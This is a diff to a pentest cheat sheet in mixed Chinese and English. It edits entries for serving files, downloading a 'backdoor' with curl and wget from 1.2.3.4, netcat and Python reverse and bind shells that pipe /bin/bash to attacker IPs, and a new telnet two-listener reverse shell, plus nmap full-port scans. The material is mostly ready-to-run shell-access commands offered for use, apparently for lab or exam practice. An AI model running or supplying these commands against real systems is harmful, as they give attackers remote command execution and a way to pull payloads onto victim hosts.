@@ -78,13 +78,13 @@ base64  binaryfile | nc -w 3 10.10.15.130 1235
 #### python
 
 ```python
-python -m SimpleHTTPServer 8000
+python -m SimpleHTTPServer 80
 ```
 
 #### php 5.4+
 
 ```php
-php -S 0.0.0.0:8000
+php -S 0.0.0.0:80
 ```
 
 #### ruby
@@ -144,7 +144,7 @@ curl http://1.2.3.4/backdoor
 #### wget
 
 ```
-curl http://1.2.3.4/backdoor
+wget http://1.2.3.4/backdoor -O /yourpath/backdoor
 ```
 
 #### awk
@@ -224,8 +224,20 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #Or try:
 #bind port 4444 on your target
 	nc -nvlp 4444 | /bin/bash
-#Connect to the port 4444 and using another window to listen on local 7777 then run:
-	/bin/bash | nc -n 10.11.22.31 7777  	
+#Connect to the port 4444 from attacking machine (As input)
+	nc -nv [victim ip] 4444
+#And using another window to listen on local 7777 run (As output):
+	/bin/bash | nc -n 10.11.0.71 7777
+#And you can also change it to reverse mode
+```
+
+#### telnet
+
+```
+# On linux this approach seems to nc without -e
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 4444 | /bin/sh | [local ip] 4445
 ```
 
 #### Java
@@ -241,7 +253,7 @@ p.waitFor()
 `xterm -display 10.0.0.1:1`
 
 
-### 升级Shell 
+### Upgrade your Shell 
 ```
 ```
 
@@ -251,6 +263,10 @@ p.waitFor()
 #### 端口探测
 
 ```
+nmap --min-rtt-timeout=1 -p- -A 10.1.1.1
+```
+
+```
 nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.5
 ```
 
@@ -258,13 +274,21 @@ nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.5
 nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
 ```
 
-### 常用命令
+#### NSE脚本扫描
+
+```
+https://github.com/JohnRyk/FluentNmap
+```
+
+
+### 杂项
 
 #### 使用 pyinstaller 把py脚本打包成 .exe 文件
 ```
 # 需要安装 pyinstaller 和 pywin32
 
 ```
+#### Cross Compile
 
 
 #### 编译 windows 执行程序
